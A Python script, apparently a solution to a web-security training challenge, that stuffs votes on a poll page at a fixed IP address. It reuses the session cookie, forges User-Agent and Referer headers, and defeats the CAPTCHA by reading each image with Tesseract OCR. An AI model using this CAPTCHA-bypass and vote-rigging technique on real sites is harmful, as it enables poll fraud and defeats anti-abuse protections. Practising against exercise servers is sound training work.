#!/usr/bin/python3
from io import BytesIO
import requests
import pytesseract
from PIL import Image


url = 'http://158.69.76.135/level3.php'
headwin = ("Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {"User-Agent": headwin, "Referer": url}
ID = 2224
s = requests.session()
response = s.get(url)
text = response.text.split()
try:
    txtId = text.index(str(ID))
except:
    txtId = 0
key = response.cookies['HoldTheDoor']
cookie = {'HoldTheDoor': key}
currentVote = 0
if (text[txtId+3]).isdigit():
    currentVote = int(text[txtId+3])

for x in range(currentVote, 29):
    img_url = 'http://158.69.76.135/level3/captcha.php'
    res_img = s.get(img_url)

    original = Image.open(BytesIO(res_img.content))
    captcha = pytesseract.image_to_string(original)
    captcha = captcha.strip()
    print(captcha)
    sender = s.post(url, {'id': ID, 'holdthedoor': 'submit', 'key': key, 'captcha': captcha}, cookies=cookie, headers=header)

    if sender.status_code is 200 and "Hold" in sender.text:
        print("ok", end="\r", flush=True)
    else:
        print("fail")

print("end of program")
